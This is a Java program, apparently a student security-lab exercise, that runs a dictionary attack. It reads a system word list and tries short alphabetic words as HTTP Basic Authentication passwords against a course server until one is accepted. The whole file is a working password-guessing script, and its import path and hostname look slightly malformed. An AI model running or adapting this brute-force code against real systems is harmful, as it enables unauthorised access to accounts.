import java.io.*;
import java.util.Date;
import java.util.regex.*; 





import java.jscape.inet.http.*;







class Dictionary
{
   public static void main (String args[]) throws Exception
   {
      String username = "";
      int errorMessage = 401;   
      int attempts = 0;

      FileReader fReader = new FileReader ("/usr/share/lib/dict/words");
      BufferedReader buffReader = new BufferedReader (fReader);
      
      String word;
      int wordLength ;

      Http http = new Http();
      HttpRequest request = new HttpRequest ("http://sec-crack.cs.rmit.edu./SEC/2/" );
      

      Date startDate = new Date(); 
 

      while(( word = buffReader.readLine()) != null)
      {
         if (errorMessage == 200)
            break; 
         
         wordLength = word.length();
 
         if(wordLength <=3) 
         {
            
            Pattern lettersOnly = Pattern.compile ("[A-Za-z]+");
            Matcher pword = lettersOnly.matcher (word); 
            if (pword.matches() == true)
            { 
               String password = pword.group();
               request.setBasicAuthentication(username,password);
               HttpResponse response = http.getResponse(request);
               errorMessage = response.getResponseCode();
               System.out.println(errorMessage);
               System.out.println(password);
               attempts++;
               if (errorMessage == 200)
                  break;
            }
         }
      }
      Date endDate = new Date();
      System.out.println("Password crack finished: " + endDate);
      System.out.println("Password crack started: " + startDate);
      System.out.println(" of attempts: " + attempts);
   }
} 
      
            
      
      
      